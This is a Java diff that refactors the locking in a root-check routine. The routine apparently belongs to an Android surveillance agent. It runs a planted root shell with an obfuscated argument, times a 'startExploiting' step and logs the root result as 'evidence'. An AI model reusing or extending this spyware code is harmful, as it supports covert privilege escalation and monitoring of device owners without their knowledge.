@@ -123,67 +123,69 @@ public class PackageInfo {
 		return permFound;
 	}
 
-	static synchronized public boolean checkRoot() { //$NON-NLS-1$
+	static public boolean checkRoot() { //$NON-NLS-1$
 		boolean isRoot = false;
 
 		if (Status.haveRoot()) {
 			return true;
 		}
 
-		try {
-			// Verifichiamo di essere root
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
-			}
-			final AutoFile file = new AutoFile(Configuration.shellFileBase);
+		synchronized(PackageInfo.class) {
+			try {
+				// Verifichiamo di essere root
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
+				}
+				final AutoFile file = new AutoFile(Configuration.shellFileBase);
 
-			if (file.exists() && file.canRead()) {
+				if (file.exists() && file.canRead()) {
 
-				final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
-				String stdout = p.getStdout();
-				if (stdout.startsWith(M.e("uid=0"))) {
+					final ExecuteResult p = Execute.execute(Configuration.shellFile + M.e(" qzx id"));
+					String stdout = p.getStdout();
+					if (stdout.startsWith(M.e("uid=0"))) {
 
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 
-						Date timestamp = new Date();
-						long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
+							Date timestamp = new Date();
+							long diff = (timestamp.getTime() - Root.startExploiting.getTime()) / 1000;
 
-						if (!sentInfo) {
-							EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
-							if (Cfg.DEMO) {
-								Status.self().makeToast("Root acquired");
+							if (!sentInfo) {
+								EvidenceBuilder.info("Root: " + Root.method + " time: " + diff + "s");
+								if (Cfg.DEMO) {
+									Status.self().makeToast("Root acquired");
+								}
+							}
+
+						} else {
+							if (!sentInfo) {
+								EvidenceBuilder.info(M.e("Root"));
 							}
 						}
 
+						isRoot = true;
 					} else {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
+						}
 						if (!sentInfo) {
-							EvidenceBuilder.info(M.e("Root"));
+							EvidenceBuilder.info("Root: NO");
 						}
 					}
-
-					isRoot = true;
-				} else {
-					if (Cfg.DEBUG) {
-						Check.log(TAG + " (checkRoot): isRoot NOOOOO"); //$NON-NLS-1$ //$NON-NLS-2$
-					}
-					if (!sentInfo) {
-						EvidenceBuilder.info("Root: NO");
-					}
+					sentInfo = true;
 				}
-				sentInfo = true;
-			}
-		} catch (final Exception e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
+			} catch (final Exception e) {
+				if (Cfg.EXCEPTION) {
+					Check.log(e);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(e);//$NON-NLS-1$
+				}
 			}
 
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
+			Status.setRoot(isRoot);
 		}
-
-		Status.setRoot(isRoot);
 		return isRoot;
 	}
 
